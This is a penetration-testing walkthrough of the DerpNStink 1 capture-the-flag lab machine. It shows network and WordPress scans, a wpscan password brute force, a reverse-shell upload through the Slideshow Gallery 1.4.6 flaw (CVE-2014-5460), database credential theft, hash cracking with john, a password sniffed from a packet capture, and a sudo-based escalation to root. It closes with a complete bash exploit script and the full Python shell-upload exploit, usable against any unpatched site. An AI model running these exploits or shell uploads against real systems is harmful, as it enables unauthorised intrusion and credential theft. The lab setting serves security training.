<https://www.vulnhub.com/entry/derpnstink-1,221/>

<https://hackso.me/derpnstink-1-walkthrough/>

Keys : wordpress, slideshow gallery, john, tcpdump, modify suid script

# Scan

## nmap

    └─$ sudo nmap -sT -A -T4 -Pn -n  -p- 192.168.56.9
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 14:28 CEST
    Nmap scan report for 192.168.56.9
    Host is up (0.0011s latency).
    Not shown: 65532 closed ports
    PORT   STATE SERVICE VERSION
    21/tcp open  ftp     vsftpd 3.0.2
    22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)
    |   2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)
    |   256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)
    |_  256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)
    80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
    | http-robots.txt: 2 disallowed entries 
    |_/php/ /temporary/
    |_http-server-header: Apache/2.4.7 (Ubuntu)
    |_http-title: DeRPnStiNK
    MAC Address: 08:00:27:9C:D8:6C (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    TRACEROUTE
    HOP RTT     ADDRESS
    1   1.11 ms 192.168.56.9

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds

## dirsearch

    └─$ dirsearch  -u http://192.168.56.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
                                                       
    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 220520

    Target: http://192.168.56.9/
                                                                                                                                    
    [09:08:35] Starting: 
    [09:08:35] 301 -  312B  - /weblog  ->  http://192.168.56.9/weblog/
    [09:08:35] 301 -  309B  - /php  ->  http://192.168.56.9/php/
    [09:08:35] 301 -  309B  - /css  ->  http://192.168.56.9/css/
    [09:08:36] 301 -  308B  - /js  ->  http://192.168.56.9/js/
    [09:08:36] 301 -  316B  - /javascript  ->  http://192.168.56.9/javascript/
    [09:09:21] 301 -  315B  - /temporary  ->  http://192.168.56.9/temporary/ 

## curl 

    $ curl -v http://192.168.56.9/weblog/
    *   Trying 192.168.56.9:80...
    * Connected to 192.168.56.9 (192.168.56.9) port 80 (#0)
    > GET /weblog/ HTTP/1.1
    > Host: 192.168.56.9
    > User-Agent: curl/7.79.1
    > Accept: */*
    > 
    * Mark bundle as not supporting multiuse
    < HTTP/1.1 301 Moved Permanently
    < Date: Thu, 25 Nov 2021 07:07:12 GMT
    < Server: Apache/2.4.7 (Ubuntu)
    < X-Powered-By: PHP/5.5.9-1ubuntu4.22
    < X-Pingback: http://derpnstink.local/weblog/xmlrpc.php
    < Location: http://derpnstink.local/weblog/
    < Content-Length: 0
    < Content-Type: text/html; charset=UTF-8
    < 
    * Connection #0 to host 192.168.56.9 left intact

==> Modify _/etc/hosts_ with the hostname _derpnstink.local_

## dirsearch bis

    $ dirsearch  -u http://derpnstink.local/weblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                           
    Target: http://derpnstink.local/weblog/
                                                                                                                                     
    [09:18:09] Starting: 
    [09:18:09] 301 -  331B  - /weblog/wp-content  ->  http://derpnstink.local/weblog/wp-content/
    [09:18:10] 301 -  332B  - /weblog/wp-includes  ->  http://derpnstink.local/weblog/wp-includes/
    [09:18:14] 301 -  329B  - /weblog/wp-admin  ->  http://derpnstink.local/weblog/wp-admin/
                                                                                                                       
    Task Completed

## Get information

    └─$ curl http://derpnstink.local


    <--flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) -->



    └─$ curl http://derpnstink.local/webnotes/info.txt
    <-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --> 
     

## wpscan

    └─$ wpscan --url http://derpnstink.local/weblog/ -e u --no-update --no-banner                                                    
    [+] URL: http://derpnstink.local/weblog/ [192.168.56.9]
    [+] Started: Thu Nov 25 09:20:50 2021

    Interesting Finding(s):

    [+] Headers
     | Interesting Entries:
     |  - Server: Apache/2.4.7 (Ubuntu)
     |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
     | Found By: Headers (Passive Detection)
     | Confidence: 100%

    [+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
     | Confirmed By:
     |  - Link Tag (Passive Detection), 30% confidence
     |  - Direct Access (Aggressive Detection), 100% confidence
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

    [+] WordPress readme found: http://derpnstink.local/weblog/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).
     | Found By: Emoji Settings (Passive Detection)
     |  - http://derpnstink.local/weblog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'
     | Confirmed By: Meta Generator (Passive Detection)
     |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.9'

    [+] WordPress theme in use: twentysixteen
     | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
     | Last Updated: 2021-07-22T00:00:00.000Z
     | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
     | [!] The version is out of date, the latest version is 2.5
     | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9
     | Style Name: Twenty Sixteen
     | Style URI: https://wordpress.org/themes/twentysixteen/
     | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Css Style In Homepage (Passive Detection)
     |
     | Version: 1.3 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9, Match: 'Version: 1.3'

    [+] Enumerating Users (via Passive and Aggressive Methods)
     Brute Forcing Author IDs - Time: 00:00:00 <===================================================> (10 / 10) 100.00% Time: 00:00:00

    [i] User(s) Identified:

    [+] admin
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)

    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

    [+] Finished: Thu Nov 25 09:20:52 2021
    [+] Requests Done: 53
    [+] Cached Requests: 8
    [+] Data Sent: 14.336 KB
    [+] Data Received: 221.85 KB
    [+] Memory used: 160.922 MB
    [+] Elapsed time: 00:00:01


## wpscan bis

    └─$ wpscan --url http://derpnstink.local/weblog/ --no-banner --no-update --plugins-version-detection aggressive --plugins-detection aggressive  --detection-mode aggressive
    └─$ wpscan --url http://derpnstink.local/weblog/ --no-banner --no-update -P /usr/share/wordlists/rockyou.txt 
    [+] URL: http://derpnstink.local/weblog/ [192.168.56.9]
    [+] Started: Thu Nov 25 09:41:40 2021

    Interesting Finding(s):

    [+] Headers
     | Interesting Entries:
     |  - Server: Apache/2.4.7 (Ubuntu)
     |  - X-Powered-By: PHP/5.5.9-1ubuntu4.22
     | Found By: Headers (Passive Detection)
     | Confidence: 100%

    [+] XML-RPC seems to be enabled: http://derpnstink.local/weblog/xmlrpc.php
     | Found By: Headers (Passive Detection)
     | Confidence: 100%
     | Confirmed By:
     |  - Link Tag (Passive Detection), 30% confidence
     |  - Direct Access (Aggressive Detection), 100% confidence
     | References:
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

    [+] WordPress readme found: http://derpnstink.local/weblog/readme.html
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://derpnstink.local/weblog/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)
     | Confidence: 60%
     | References:
     |  - https://www.iplocation.net/defend-wordpress-from-ddos
     |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 4.6.9 identified (Insecure, released on 2017-11-29).
     | Found By: Emoji Settings (Passive Detection)
     |  - http://derpnstink.local/weblog/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.6.9'
     | Confirmed By: Meta Generator (Passive Detection)
     |  - http://derpnstink.local/weblog/, Match: 'WordPress 4.6.9'

    [+] WordPress theme in use: twentysixteen
     | Location: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/
     | Last Updated: 2021-07-22T00:00:00.000Z
     | Readme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txt
     | [!] The version is out of date, the latest version is 2.5
     | Style URL: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9
     | Style Name: Twenty Sixteen
     | Style URI: https://wordpress.org/themes/twentysixteen/
     | Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthead ...
     | Author: the WordPress team
     | Author URI: https://wordpress.org/
     |
     | Found By: Css Style In Homepage (Passive Detection)
     |
     | Version: 1.3 (80% confidence)
     | Found By: Style (Passive Detection)
     |  - http://derpnstink.local/weblog/wp-content/themes/twentysixteen/style.css?ver=4.6.9, Match: 'Version: 1.3'

    [+] Enumerating All Plugins (via Passive Methods)
    [+] Checking Plugin Versions (via Passive and Aggressive Methods)

    [i] Plugin(s) Identified:

    [+] slideshow-gallery <== HERE
     | Location: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/
     | Last Updated: 2021-08-19T23:03:00.000Z
     | [!] The version is out of date, the latest version is 1.7.3
     |
     | Found By: Urls In Homepage (Passive Detection)
     |
     | Version: 1.4.6 (100% confidence)
     | Found By: Readme - Stable Tag (Aggressive Detection)
     |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
     |  - http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt

    [+] Enumerating Config Backups (via Passive and Aggressive Methods)
     Checking Config Backups - Time: 00:00:00 <==================================================> (137 / 137) 100.00% Time: 00:00:00

    [i] No Config Backups Found.

    [+] Enumerating Users (via Passive and Aggressive Methods)
     Brute Forcing Author IDs - Time: 00:00:00 <===================================================> (10 / 10) 100.00% Time: 00:00:00

    [i] User(s) Identified:

    [+] admin
     | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
     | Confirmed By: Login Error Messages (Aggressive Detection)

    [+] Performing password attack on Xmlrpc against 1 user/s
    [SUCCESS] - admin / admin                                                                                                        
    Trying admin / admin Time: 00:04:19 <                                                  > (19820 / 14364212)  0.13%  ETA: ??:??:??

    [!] Valid Combinations Found:
     | Username: admin, Password: admin <== HERE

    [!] No WPScan API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

    [+] Finished: Thu Nov 25 09:46:04 2021
    [+] Requests Done: 20015
    [+] Cached Requests: 8
    [+] Data Sent: 10.488 MB
    [+] Data Received: 12.602 MB
    [+] Memory used: 263.031 MB
    [+] Elapsed time: 00:04:23


==> Slideshow Gallery 1.4.6 <http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txt>


# Exploit wpscan plugin slideshow gallery 1.4.6 with admin/admin


## Web shell
    
    └─$ searchsploit  Slideshow Gallery 1.4.6
    ----------------------------------------------------------------------------- ---------------------------------
     Exploit Title                                                               |  Path
    ----------------------------------------------------------------------------- ---------------------------------
    WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload             | php/webapps/34514.txt
    WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload             | php/webapps/34681.py
    ----------------------------------------------------------------------------- ---------------------------------
    Shellcodes: No Results


==> Use _Burp Suite_ to upload the shell.


    curl -s http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/php-reverse-shell.php

    $ nc -lvp 1234                                           
    listening on [any] 1234 ...
    connect to [192.168.56.1] from derpnstink.local [192.168.56.9] 35752
    Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux
     08:22:14 up  6:30,  1 user,  load average: 0.00, 0.00, 0.00
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    stinky   pts/4    192.168.56.1     04:11   10:14   0.49s  0.01s sshd: stinky [priv] 
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)


## Get informations


    ls -al /home
    total 16
    drwxr-xr-x  4 root   root   4096 Nov 12  2017 .
    drwxr-xr-x 23 root   root   4096 Nov 12  2017 ..
    drwx------ 10 mrderp mrderp 4096 Jan  9  2018 mrderp
    drwx------ 12 stinky stinky 4096 Jan  9  2018 stinky

    
    www-data@DeRPnStiNK:/var/www/html/weblog$ cat wp-config.php

    define('DB_NAME', 'wordpress');

    /** MySQL database username */
    define('DB_USER', 'root');

    /** MySQL database password */
    define('DB_PASSWORD', 'mysql');

    /** MySQL hostname */
    define('DB_HOST', 'localhost');

    /** Database Charset to use in creating database tables. */
    define('DB_CHARSET', 'utf8');

    www-data@DeRPnStiNK:/tmp$ uname -a
    uname -a
    Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux

    mysql> select user_login, user_pass from wp_users;
    select user_login, user_pass from wp_users;
    +-------------+------------------------------------+
    | user_login  | user_pass                          |
    +-------------+------------------------------------+
    | unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 |
    | admin       | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ |
    +-------------+------------------------------------+

    └─$ john key --wordlist=/usr/share/wordlists/rockyou.txt                               1 ⨯
    Using default input encoding: UTF-8
    Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
    Cost 1 (iteration count) is 8192 for all loaded hashes
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    wedgie57         (?)
    1g 0:00:00:39 DONE (2021-04-09 23:32) 0.02525g/s 70631p/s 70631c/s 70631C/s wee1994....wedders1234
    Use the "--show --format=phpass" options to display all of the cracked passwords reliably
    Session completed

## stinky privilege
                                                                                           
    www-data@DeRPnStiNK:/$ su stinky
    Password: wedgie57


    stinky@DeRPnStiNK:~$ cat .bash_history 
    ...
    tcpdump -r derpissues.pcap
    tcpdump -r derpissues.pcap | less
    tcpdump -r derpissues.pcap | grep pass
    tcpdump -r derpissues.pcap | grep pas
    tcpdump -r derpissues.pcap | grep pa
    tcpdump -r derpissues.pcap | grep user
    tcpdump -r derpissues.pcap | grep pwd
    tcpdump -r derpissues.pcap | grep derp
    tcpdump -r derpissues.pcap
    su mrderp
    ...
    

    stinky@DeRPnStiNK:~$ cat ftp/files/network-logs/derpissues.txt 
    12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?
    12:07 stinky: yeah. did you need a password reset?
    12:07 mrderp: I think i accidently deleted my account
    12:07 mrderp: i just need to logon once to make a change
    12:07 stinky: im gonna packet capture so we can figure out whats going on
    12:07 mrderp: that seems a bit overkill, but wtv
    12:08 stinky: commence the sniffer!!!!
    12:08 mrderp: -_-
    12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?
    12:11 mrderp: awesome it works!
    12:12 stinky: we really are the best sysadmins #team
    12:13 mrderp: i guess we are...
    12:15 mrderp: alright I made the changes, feel free to decomission my account
    12:20 stinky: done! yay


    stinky@DeRPnStiNK:~/Documents$ tcpdump  -r derpissues.pcap  -A  | grep 'log=mrderp' 
    reading from file derpissues.pcap, link-type LINUX_SLL (Linux cooked)
    log=mrderp&pwd=derpderpderpderpderpderpderp&wp-submit=Log+In&redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&testcookie=1



## mrderp privilege


    stinky@DeRPnStiNK:~/Documents$ su mrderp
    Password: derpderpderpderpderpderpderp

## Get root

    mrderp@DeRPnStiNK:/home/stinky/Documents$ sudo -l
    [sudo] password for mrderp: derpderpderpderpderpderpderp
    Matching Defaults entries for mrderp on DeRPnStiNK:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User mrderp may run the following commands on DeRPnStiNK:
        (ALL) /home/mrderp/binaries/derpy*
    mrderp@DeRPnStiNK:/home/stinky/Documents$ cat /home/mrderp/binaries/derpy*
    #/bin/bash
    /bin/bash
    mrderp@DeRPnStiNK:/home/stinky/Documents$ sudo /home/mrderp/binaries/derpy*
    root@DeRPnStiNK:/home/stinky/Documents# id
    uid=0(root) gid=0(root) groups=0(root)

# Box install

## /etc/ssh/sshd_config
    
    ...
    PasswordAuthentication no
    ...
    Match User mrderp
        PasswordAuthentication yes

# Script to exploit wordpress slideshow gallery

## Bash

    <https://hackso.me/derpnstink-1-walkthrough/>
    #!/bin/bash

    HOST=derpnstink.local
    BLOG=weblog
    USER=admin
    PASS=$USER
    VULN="wp-admin/admin.php?page=slideshow-slides&method=save"
    FILE=$1

    # authenticate
    curl \
        -s \
        -c cookie \
        -d "log=$USER&pwd=$PASS&wp-submit=Log" \
        http://$HOST/$BLOG/wp-login.php

    # exploit
    curl \
        -s \
        -b cookie \
        -H "Expect:" \
        -o /dev/null \
        -F "Slide[id]=" \
        -F "Slide[order]=" \
        -F "Slide[title]=$(mktemp -u | sed -r 's/^.*tmp\.(.*)$/\1/')" \
        -F "Slide[description]=" \
        -F "Slide[showinfo]=both" \
        -F "Slide[iopacity]=70" \
        -F "Slide[galleries][]=1" \
        -F "Slide[type]=file" \
        -F "image_file=@$FILE;filename=$FILE;type=application/octet-stream" \
        -F "Slide[image_url]=" \
        -F "Slide[uselink]=N" \
        -F "Slide[link]=" \
        -F "Slide[linktarget]=self" \
        -F "submit=Save Slide" \
        http://$HOST/$BLOG/$VULN

    # cleanup

    rm -rf cookie

## Python

    #!/usr/bin/env python
    #
    # WordPress Slideshow Gallery 1.4.6 Shell Upload Exploit
    #
    # WordPress Slideshow Gallery plugin version 1.4.6 suffers from a remote shell upload vulnerability (CVE-2014-5460)
    #
    # Vulnerability discovered by: Jesus Ramirez Pichardo - http://whitexploit.blogspot.mx/
    #
    # Exploit written by: Claudio Viviani - info@homelab.it - http://www.homelab.it
    #
    #
    # Disclaimer:
    #
    # This exploit is intended for educational purposes only and the author
    # can not be held liable for any kind of damages done whatsoever to your machine,
    # or damages caused by some other,creative application of this exploit.
    # In any case you disagree with the above statement,stop here.
    #
    #
    # Requirements:
    #
    # 1) Enabled user management slide
    # 2) python's httplib2 lib
    #    Installation: pip install httplib2
    #
    # Usage:
    #
    # python wp_gallery_slideshow_146_suv.py -t http[s]://localhost -u user -p pwd -f sh33l.php
    # python wp_gallery_slideshow_146_suv.py -t http[s]://localhost/wordpress -u user -p pwd -f sh33l.php
    # python wp_gallery_slideshow_146_suv.py -t http[s]://localhost:80|443 -u user -p pwd -f sh33l.php
    #
    # Backdoor Location:
    #
    # http://localhost/wp-content/uploads/slideshow-gallery/sh33l.php
    #
    # Tested on Wordpress 3.6, 3.7, 3.8, 3.9, 4.0
    #

    # http connection
    import urllib, httplib2, sys, mimetypes
    # Args management
    import optparse
    # Error management
    import socket, httplib, sys
    # file management
    import os, os.path

    # Check url
    def checkurl(url):
        if url[:8] != "https://" and url[:7] != "http://":
            print('[X] You must insert http:// or https:// procotol')
            sys.exit(1)
        else:
            return url

    # Check if file exists and has readable
    def checkfile(file):
        if not os.path.isfile(file) and not os.access(file, os.R_OK):
            print '[X] '+file+' file is missing or not readable'
            sys.exit(1)
        else:
            return file
    # Get file's mimetype
    def get_content_type(filename):
        return mimetypes.guess_type(filename)[0] or 'application/octet-stream'

    # Create multipart header
    def create_body_sh3ll_upl04d(payloadname):

       getfields = dict()
       getfields['Slide[id]'] = ''
       getfields['Slide[order]'] = ''
       getfields['Slide[title]'] = 'h0m3l4b1t'
       getfields['Slide[description]'] = 'h0m3l4b1t'
       getfields['Slide[showinfo]'] = 'both'
       getfields['Slide[iopacity]'] = '70'
       getfields['Slide[type]'] = 'file'
       getfields['Slide[image_url]'] = ''
       getfields['Slide[uselink]'] = 'N'
       getfields['Slide[link]'] = ''
       getfields['Slide[linktarget]'] = 'self'
       getfields['Slide[title]'] = 'h0m3l4b1t'

       payloadcontent = open(payloadname).read()

       LIMIT = '----------lImIt_of_THE_fIle_eW_$'
       CRLF = '\r\n'

       L = []
       for (key, value) in getfields.items():
          L.append('--' + LIMIT)
          L.append('Content-Disposition: form-data; name="%s"' % key)
          L.append('')
          L.append(value)

       L.append('--' + LIMIT)
       L.append('Content-Disposition: form-data; name="%s"; filename="%s"' % ('image_file', payloadname))
       L.append('Content-Type: %s' % get_content_type(payloadname))
       L.append('')
       L.append(payloadcontent)
       L.append('--' + LIMIT + '--')
       L.append('')
       body = CRLF.join(L)
       return body

    banner = """
      =============================================
      - Release date: 2014-08-28
      - Discovered by: Jesus Ramirez Pichardo
      - CVE: 2014-5460
      =============================================

                      Written by:

                    Claudio Viviani

                 http://www.homelab.it

                    info@homelab.it
                 homelabit@protonmail.ch

            https://www.facebook.com/homelabit
            https://twitter.com/homelabit
            https://plus.google.com/+HomelabIt1/
    https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
    """

    commandList = optparse.OptionParser('usage: %prog -t URL -u USER -p PASSWORD -f FILENAME.PHP [--timeout sec]')
    commandList.add_option('-t', '--target', action="store",
                      help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                      )
    commandList.add_option('-f', '--file', action="store",
                      help="Insert file name, ex: shell.php",
                      )
    commandList.add_option('-u', '--user', action="store",
                      help="Insert Username",
                      )
    commandList.add_option('-p', '--password', action="store",
                      help="Insert Password",
                      )
    commandList.add_option('--timeout', action="store", default=10, type="int",
                      help="[Timeout Value] - Default 10",
                      )

    options, remainder = commandList.parse_args()

    # Check args
    if not options.target or not options.user or not options.password or not options.file:
        print(banner)
        commandList.print_help()
        sys.exit(1)

    payloadname = checkfile(options.file)
    host = checkurl(options.target)
    username = options.user
    pwd = options.password
    timeout = options.timeout

    print(banner)

    url_login_wp = host+'/wp-login.php'
    url_admin_slideshow = host+'/wp-admin/admin.php?page=slideshow-slides&method=save'

    content_type = 'multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$'

    http = httplib2.Http(disable_ssl_certificate_validation=True, timeout=timeout)

    # Wordpress login POST Data
    body = { 'log':username,
             'pwd':pwd,
             'wp-submit':'Login',
             'testcookie':'1' }
    # Wordpress login headers with Cookie
    headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                'Content-type': 'application/x-www-form-urlencoded',
                'Cookie': 'wordpress_test_cookie=WP+Cookie+check' }
    try:
        response, content = http.request(url_login_wp, 'POST', headers=headers, body=urllib.urlencode(body))
        if len(response['set-cookie'].split(" ")) < 4:
        #if 'httponly' in response['set-cookie'].split(" ")[-1]:
            print '[X] Wrong username or password'
            sys.exit()
        else:
            print '[+] Username & password ACCEPTED!\n'

            # Create cookie for admin panel
            if 'secure' in response['set-cookie']:
                c00k13 = response['set-cookie'].split(" ")[6]+' '+response['set-cookie'].split(" ")[0]+' '+response['set-cookie'].split(" ")[10]
            else:
                c00k13 = response['set-cookie'].split(" ")[5]+' '+response['set-cookie'].split(" ")[0]+' '+response['set-cookie'].split(" ")[8]

            bodyupload = create_body_sh3ll_upl04d(payloadname)

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
                       'Cookie': c00k13,
                       'content-type': content_type,
                       'content-length': str(len(bodyupload)) }
            response, content = http.request(url_admin_slideshow, 'POST', headers=headers, body=bodyupload)

            if 'admin.php?page=slideshow-slides&Galleryupdated=true&Gallerymessage=Slide+has+been+saved' in content:
                print '[!] Shell Uploaded!'
                print '[+] Check url: '+host+'/wp-content/uploads/slideshow-gallery/'+payloadname.lower()+' (lowercase!!!!)'
            else:
                print '[X] The user can not upload files or plugin fixed :((('

    except socket.timeout:
        print('[X] Connection Timeout')
        sys.exit(1)
    except socket.error:
        print('[X] Connection Refused')
        sys.exit(1)
    except httplib.ResponseNotReady:
        print('[X] Server Not Responding')
        sys.exit(1)
    except httplib2.ServerNotFoundError:
        print('[X] Server Not Found')
        sys.exit(1)
    except httplib2.HttpLib2Error:
        print('[X] Connection Error!!')
        sys.exit(1)

